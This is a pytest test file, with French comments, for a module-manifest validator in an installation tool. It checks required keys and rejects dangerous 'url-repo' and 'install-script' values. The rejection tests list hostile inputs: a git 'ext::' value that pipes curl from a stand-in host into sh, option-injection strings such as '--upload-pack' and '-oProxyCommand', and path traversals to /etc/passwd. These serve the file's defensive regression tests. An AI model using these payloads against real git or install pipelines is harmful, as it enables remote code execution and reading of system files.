import pytest

from Utils.Administration.Modules.Installation.check_config_parameters import (
    check_config_parameters,
    ModuleConfigValidationError,
)


def _valid_manifest():
    return {
        "name": "test",
        "url-repo": "https://example.invalid/repo.git",
        "guidelines": "#",
        "beta": False,
        "configuration": {
            "html-input": {
                "input1": {"type": "url", "default-value": "https://example.invalid"},
            },
            "install-script": "install.sh",
        },
    }


def test_valid_manifest_passes():
    check_config_parameters(_valid_manifest())  # ne doit pas lever


@pytest.mark.parametrize("key", ["name", "url-repo", "guidelines", "beta", "configuration"])
def test_missing_top_level_key_raises(key):
    manifest = _valid_manifest()
    del manifest[key]

    with pytest.raises(ModuleConfigValidationError) as excinfo:
        check_config_parameters(manifest)

    assert any(key in error for error in excinfo.value.errors)


@pytest.mark.parametrize("key", ["html-input", "install-script"])
def test_missing_configuration_key_raises(key):
    manifest = _valid_manifest()
    del manifest["configuration"][key]

    with pytest.raises(ModuleConfigValidationError) as excinfo:
        check_config_parameters(manifest)

    assert any(key in error for error in excinfo.value.errors)


def test_multiple_missing_keys_are_all_reported():
    manifest = _valid_manifest()
    del manifest["name"]
    del manifest["guidelines"]

    with pytest.raises(ModuleConfigValidationError) as excinfo:
        check_config_parameters(manifest)

    assert len(excinfo.value.errors) == 2


def test_old_schema_fields_are_ignored_not_required():
    """Le manifeste ne doit plus jamais exiger d'infos d'infra (SSH/DB) — un ancien fichier
    qui en contient encore ne doit pas planter, elles sont simplement ignorées."""
    manifest = _valid_manifest()
    manifest["configuration"]["database"] = {"connection": {"url": "", "port": 3306}}
    manifest["configuration"]["global"] = {"installation": {"ssh-url": ""}}

    check_config_parameters(manifest)  # ne doit pas lever


@pytest.mark.parametrize("local_path", [
    "/srv/repos/mon-module",
    "../repos/mon-module",
    "mon-module",
])
def test_local_filesystem_path_is_a_valid_url_repo(local_path):
    """L'installation 'local' clone depuis un chemin filesystem brut, pas une URL : ça doit
    rester accepté, seuls les vecteurs d'exécution de commande sont bloqués (cf. tests ci-dessous)."""
    manifest = _valid_manifest()
    manifest["url-repo"] = local_path

    check_config_parameters(manifest)  # ne doit pas lever


@pytest.mark.parametrize("dangerous_url", [
    "ext::sh -c 'curl http://evil.invalid/x|sh'",
    "--upload-pack=touch /tmp/pwned",
    "-oProxyCommand=curl evil.invalid",
    "",
])
def test_dangerous_url_repo_is_rejected(dangerous_url):
    """Régression sécurité : 'ext::' exécute une commande shell arbitraire au clone, et une
    valeur commençant par '-' est interprétée par git comme une option (injection d'argument)."""
    manifest = _valid_manifest()
    manifest["url-repo"] = dangerous_url

    with pytest.raises(ModuleConfigValidationError) as excinfo:
        check_config_parameters(manifest)

    assert any("url-repo" in error for error in excinfo.value.errors)


@pytest.mark.parametrize("dangerous_script", [
    "../../etc/passwd",
    "sub/../../escape.sh",
    "/etc/passwd",
    "-x",
    "",
])
def test_dangerous_install_script_is_rejected(dangerous_script):
    """Régression sécurité : 'install-script' doit rester un chemin relatif interne au dépôt
    cloné, pas un chemin absolu, une remontée de répertoire ('..'), ni une option shell."""
    manifest = _valid_manifest()
    manifest["configuration"]["install-script"] = dangerous_script

    with pytest.raises(ModuleConfigValidationError) as excinfo:
        check_config_parameters(manifest)

    assert any("install-script" in error for error in excinfo.value.errors)
